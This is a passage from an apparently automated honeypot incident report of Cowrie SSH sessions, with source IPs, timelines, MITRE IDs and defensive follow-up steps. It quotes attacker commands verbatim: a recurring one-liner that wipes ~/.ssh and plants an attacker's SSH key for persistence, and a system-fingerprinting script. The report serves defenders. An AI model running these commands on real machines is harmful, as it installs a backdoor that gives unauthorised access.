| `2026-09-08 05:16:10` | `cowrie.client.version` |
| `2026-09-08 05:16:10` | `cowrie.client.kex` |
| `2026-09-08 05:16:11` | `cowrie.login.success` |
| `2026-09-08 05:16:13` | `cowrie.session.params` |
| `2026-09-08 05:16:13` | `cowrie.command.input` |
| `2026-09-08 05:16:13` | `cowrie.log.closed` |
| `2026-09-08 05:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49233e3a2c99

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-08 05:17 |
| **Last Seen** | 2026-09-08 05:18 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:17:41` | `cowrie.session.connect` |
| `2026-09-08 05:17:41` | `cowrie.client.version` |
| `2026-09-08 05:17:41` | `cowrie.client.kex` |
| `2026-09-08 05:17:42` | `cowrie.login.success` |
| `2026-09-08 05:17:47` | `cowrie.direct-tcpip.request` |
| `2026-09-08 05:17:50` | `cowrie.direct-tcpip.ja4` |
| `2026-09-08 05:17:50` | `cowrie.direct-tcpip.data` |
| `2026-09-08 05:17:52` | `cowrie.direct-tcpip.request` |
| `2026-09-08 05:17:55` | `cowrie.direct-tcpip.ja4` |
| `2026-09-08 05:17:55` | `cowrie.direct-tcpip.data` |
| `2026-09-08 05:17:57` | `cowrie.direct-tcpip.request` |
| `2026-09-08 05:18:00` | `cowrie.direct-tcpip.ja4` |
| `2026-09-08 05:18:00` | `cowrie.direct-tcpip.data` |
| `2026-09-08 05:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-915bba791806

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:18 |
| **Last Seen** | 2026-09-08 05:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:18:11` | `cowrie.session.connect` |
| `2026-09-08 05:18:11` | `cowrie.client.version` |
| `2026-09-08 05:18:11` | `cowrie.client.kex` |
| `2026-09-08 05:18:12` | `cowrie.login.success` |
| `2026-09-08 05:18:13` | `cowrie.session.params` |
| `2026-09-08 05:18:13` | `cowrie.command.input` |
| `2026-09-08 05:18:13` | `cowrie.log.closed` |
| `2026-09-08 05:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d437faa6c4c

| Field | Detail |
|---|---|
| **Source IP** | `183.82.111[.]224` |
| **First Seen** | 2026-09-08 05:18 |
| **Last Seen** | 2026-09-08 05:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:18:58` | `cowrie.session.connect` |
| `2026-09-08 05:18:58` | `cowrie.client.version` |
| `2026-09-08 05:18:58` | `cowrie.client.kex` |
| `2026-09-08 05:18:59` | `cowrie.login.success` |
| `2026-09-08 05:19:01` | `cowrie.session.params` |
| `2026-09-08 05:19:01` | `cowrie.command.input` |
| `2026-09-08 05:19:01` | `cowrie.command.failed` |
| `2026-09-08 05:19:01` | `cowrie.log.closed` |
| `2026-09-08 05:19:02` | `cowrie.session.params` |
| `2026-09-08 05:19:02` | `cowrie.command.input` |
| `2026-09-08 05:19:02` | `cowrie.session.file_download` |
| `2026-09-08 05:19:02` | `cowrie.log.closed` |
| `2026-09-08 05:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.111[.]224` to AbuseIPDB if not already reported
- [ ] Block `183.82.111[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-830ee60b5229

| Field | Detail |
|---|---|
| **Source IP** | `183.82.111[.]224` |
| **First Seen** | 2026-09-08 05:19 |
| **Last Seen** | 2026-09-08 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:19:02` | `cowrie.session.connect` |
| `2026-09-08 05:19:02` | `cowrie.client.version` |
| `2026-09-08 05:19:02` | `cowrie.client.kex` |
| `2026-09-08 05:19:03` | `cowrie.login.success` |
| `2026-09-08 05:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.111[.]224` to AbuseIPDB if not already reported
- [ ] Block `183.82.111[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4faa8e2d7094

| Field | Detail |
|---|---|
| **Source IP** | `183.82.111[.]224` |
| **First Seen** | 2026-09-08 05:19 |
| **Last Seen** | 2026-09-08 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:19:04` | `cowrie.session.connect` |
| `2026-09-08 05:19:04` | `cowrie.client.version` |
| `2026-09-08 05:19:04` | `cowrie.client.kex` |
| `2026-09-08 05:19:05` | `cowrie.login.success` |
| `2026-09-08 05:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.111[.]224` to AbuseIPDB if not already reported
- [ ] Block `183.82.111[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ec4210f5e15

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-08 05:20 |
| **Last Seen** | 2026-09-08 05:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:20:06` | `cowrie.session.connect` |
| `2026-09-08 05:20:06` | `cowrie.client.version` |
| `2026-09-08 05:20:06` | `cowrie.client.kex` |
| `2026-09-08 05:20:06` | `cowrie.login.success` |
| `2026-09-08 05:20:07` | `cowrie.direct-tcpip.request` |
| `2026-09-08 05:20:07` | `cowrie.direct-tcpip.data` |
| `2026-09-08 05:20:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffbf7ba8a43e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:20 |
| **Last Seen** | 2026-09-08 05:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:20:07` | `cowrie.session.connect` |
| `2026-09-08 05:20:08` | `cowrie.client.version` |
| `2026-09-08 05:20:08` | `cowrie.client.kex` |
| `2026-09-08 05:20:09` | `cowrie.login.success` |
| `2026-09-08 05:20:11` | `cowrie.session.params` |
| `2026-09-08 05:20:11` | `cowrie.command.input` |
| `2026-09-08 05:20:11` | `cowrie.log.closed` |
| `2026-09-08 05:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5de2799cceb1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:22 |
| **Last Seen** | 2026-09-08 05:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:22:00` | `cowrie.session.connect` |
| `2026-09-08 05:22:01` | `cowrie.client.version` |
| `2026-09-08 05:22:01` | `cowrie.client.kex` |
| `2026-09-08 05:22:02` | `cowrie.login.success` |
| `2026-09-08 05:22:03` | `cowrie.session.params` |
| `2026-09-08 05:22:03` | `cowrie.command.input` |
| `2026-09-08 05:22:03` | `cowrie.log.closed` |
| `2026-09-08 05:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-952a24d174cf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:24 |
| **Last Seen** | 2026-09-08 05:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:24:10` | `cowrie.session.connect` |
| `2026-09-08 05:24:10` | `cowrie.client.version` |
| `2026-09-08 05:24:10` | `cowrie.client.kex` |
| `2026-09-08 05:24:11` | `cowrie.login.success` |
| `2026-09-08 05:24:12` | `cowrie.session.params` |
| `2026-09-08 05:24:12` | `cowrie.command.input` |
| `2026-09-08 05:24:12` | `cowrie.log.closed` |
| `2026-09-08 05:24:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffa599bd682b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:27 |
| **Last Seen** | 2026-09-08 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:27:05` | `cowrie.session.connect` |
| `2026-09-08 05:27:05` | `cowrie.client.version` |
| `2026-09-08 05:27:05` | `cowrie.client.kex` |
| `2026-09-08 05:27:06` | `cowrie.login.success` |
| `2026-09-08 05:27:06` | `cowrie.session.params` |
| `2026-09-08 05:27:06` | `cowrie.command.input` |
| `2026-09-08 05:27:06` | `cowrie.log.closed` |
| `2026-09-08 05:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ccdc0d544a5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:29 |
| **Last Seen** | 2026-09-08 05:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:29:38` | `cowrie.session.connect` |
| `2026-09-08 05:29:38` | `cowrie.client.version` |
| `2026-09-08 05:29:38` | `cowrie.client.kex` |
| `2026-09-08 05:29:40` | `cowrie.login.success` |
| `2026-09-08 05:29:41` | `cowrie.session.params` |
| `2026-09-08 05:29:41` | `cowrie.command.input` |
| `2026-09-08 05:29:42` | `cowrie.log.closed` |
| `2026-09-08 05:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66384d3f4a4d

| Field | Detail |
|---|---|
| **Source IP** | `103.163.214[.]149` |
| **First Seen** | 2026-09-08 05:30 |
| **Last Seen** | 2026-09-08 05:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:30:38` | `cowrie.session.connect` |
| `2026-09-08 05:30:38` | `cowrie.client.version` |
| `2026-09-08 05:30:38` | `cowrie.client.kex` |
| `2026-09-08 05:30:39` | `cowrie.login.success` |
| `2026-09-08 05:30:40` | `cowrie.session.params` |
| `2026-09-08 05:30:40` | `cowrie.command.input` |
| `2026-09-08 05:30:40` | `cowrie.command.failed` |
| `2026-09-08 05:30:41` | `cowrie.log.closed` |
| `2026-09-08 05:30:42` | `cowrie.session.params` |
| `2026-09-08 05:30:42` | `cowrie.command.input` |
| `2026-09-08 05:30:42` | `cowrie.session.file_download` |
| `2026-09-08 05:30:42` | `cowrie.log.closed` |
| `2026-09-08 05:30:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.214[.]149` to AbuseIPDB if not already reported
- [ ] Block `103.163.214[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a414275c679

| Field | Detail |
|---|---|
| **Source IP** | `103.163.214[.]149` |
| **First Seen** | 2026-09-08 05:30 |
| **Last Seen** | 2026-09-08 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:30:42` | `cowrie.session.connect` |
| `2026-09-08 05:30:42` | `cowrie.client.version` |
| `2026-09-08 05:30:42` | `cowrie.client.kex` |
| `2026-09-08 05:30:43` | `cowrie.login.success` |
| `2026-09-08 05:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.214[.]149` to AbuseIPDB if not already reported
- [ ] Block `103.163.214[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c29a76a7112

| Field | Detail |
|---|---|
| **Source IP** | `103.163.214[.]149` |
| **First Seen** | 2026-09-08 05:30 |
| **Last Seen** | 2026-09-08 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:30:44` | `cowrie.session.connect` |
| `2026-09-08 05:30:44` | `cowrie.client.version` |
| `2026-09-08 05:30:44` | `cowrie.client.kex` |
| `2026-09-08 05:30:45` | `cowrie.login.success` |
| `2026-09-08 05:30:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.214[.]149` to AbuseIPDB if not already reported
- [ ] Block `103.163.214[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc6575cccfef

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:31 |
| **Last Seen** | 2026-09-08 05:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:31:22` | `cowrie.session.connect` |
| `2026-09-08 05:31:23` | `cowrie.client.version` |
| `2026-09-08 05:31:23` | `cowrie.client.kex` |
| `2026-09-08 05:31:24` | `cowrie.login.success` |
| `2026-09-08 05:31:25` | `cowrie.session.params` |
| `2026-09-08 05:31:25` | `cowrie.command.input` |
| `2026-09-08 05:31:26` | `cowrie.log.closed` |
| `2026-09-08 05:31:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c54fcb9bc96

| Field | Detail |
|---|---|
| **Source IP** | `161.35.179[.]218` |
| **First Seen** | 2026-09-08 05:32 |
| **Last Seen** | 2026-09-08 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:32:57` | `cowrie.session.connect` |
| `2026-09-08 05:32:57` | `cowrie.client.version` |
| `2026-09-08 05:32:57` | `cowrie.client.kex` |
| `2026-09-08 05:32:57` | `cowrie.login.success` |
| `2026-09-08 05:32:57` | `cowrie.session.params` |
| `2026-09-08 05:32:57` | `cowrie.command.input` |
| `2026-09-08 05:32:57` | `cowrie.command.failed` |
| `2026-09-08 05:32:57` | `cowrie.log.closed` |
| `2026-09-08 05:32:58` | `cowrie.session.params` |
| `2026-09-08 05:32:58` | `cowrie.command.input` |
| `2026-09-08 05:32:58` | `cowrie.session.file_download` |
| `2026-09-08 05:32:58` | `cowrie.log.closed` |
| `2026-09-08 05:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.179[.]218` to AbuseIPDB if not already reported
- [ ] Block `161.35.179[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13070e4614f3

| Field | Detail |
|---|---|
| **Source IP** | `161.35.179[.]218` |
| **First Seen** | 2026-09-08 05:32 |
| **Last Seen** | 2026-09-08 05:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:32:58` | `cowrie.session.connect` |
| `2026-09-08 05:32:58` | `cowrie.client.version` |
| `2026-09-08 05:32:58` | `cowrie.client.kex` |
| `2026-09-08 05:32:58` | `cowrie.login.success` |
| `2026-09-08 05:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.179[.]218` to AbuseIPDB if not already reported
- [ ] Block `161.35.179[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fa60ba2ea04

| Field | Detail |
|---|---|
| **Source IP** | `161.35.179[.]218` |
| **First Seen** | 2026-09-08 05:32 |
| **Last Seen** | 2026-09-08 05:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:32:58` | `cowrie.session.connect` |
| `2026-09-08 05:32:58` | `cowrie.client.version` |
| `2026-09-08 05:32:58` | `cowrie.client.kex` |
| `2026-09-08 05:32:58` | `cowrie.login.success` |
| `2026-09-08 05:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.179[.]218` to AbuseIPDB if not already reported
- [ ] Block `161.35.179[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c64e67d2f448

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:33 |
| **Last Seen** | 2026-09-08 05:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
